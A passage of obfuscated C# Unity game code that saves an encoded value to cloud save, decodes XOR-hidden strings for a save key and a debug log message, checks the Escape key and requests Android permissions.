#endif
            }

            var _0x947e9d4b = _0x274a1456(_0xdaca9477.ToString(), _0x0085ddb5);
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x96e02e0a._0x40b5567f(new byte[4] { 229, 230, 232, 237 }, 137) + _0x0085ddb5, _0x947e9d4b } });
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x96e02e0a._0x40b5567f(new byte[24] { 131, 140, 157, 139, 140, 133, 248, 148, 183, 185, 188, 248, 168, 185, 171, 171, 248, 189, 170, 170, 183, 170, 226, 248 }, 216) + e.Message);
#endif
            }
        }
    }

    private string _0x0bc456ee = "";
    internal bool isApplicationFocus = false;
    private int _0xed1a24d2 = 0;
    private Task _0xc74416c0(IEnumerator _0x3bc118d8)
    {
        var _0x6bf909e2 = new TaskCompletionSource<bool>();
        StartCoroutine(_0x71dc1894(_0x3bc118d8, _0x6bf909e2));
        return _0x6bf909e2.Task;
    }

    private bool _0xcb9f9acf()
    {
        var _0x855a8b86 = Keyboard.current;
        return _0x855a8b86 != null && _0x855a8b86.escapeKey.wasPressedThisFrame;
    }

    private string _0x34bc876f = "";
    private IEnumerator RequestAndroidPermissionIfNeeded(string _0x554b6641)
    {
        if (Permission.HasUserAuthorizedPermission(_0x554b6641))
            yield break;
        bool _0xe56165ee = false;
        var _0x07efabf9 = new PermissionCallbacks();
        _0x07efabf9.PermissionGranted += _0xf45444ee => _0xe56165ee = true;
        _0x07efabf9.PermissionDenied += _0xf45444ee => _0xe56165ee = true;
        Permission.RequestUserPermission(_0x554b6641, _0x07efabf9);
        yield return new WaitUntil(() => _0xe56165ee);
    }

    private string _0x8276e1fb = "";
}

internal static class _0x96e02e0a
{
    internal static string _0x40b5567f(byte[] data, byte key)
    {
        var buffer = new byte[data.Length];
        for (var i = 0; i < data.Length; i++)
            buffer[i] = (byte)(data[i] ^ key);
        return System.Text.Encoding.UTF8.GetString(buffer);
    }
}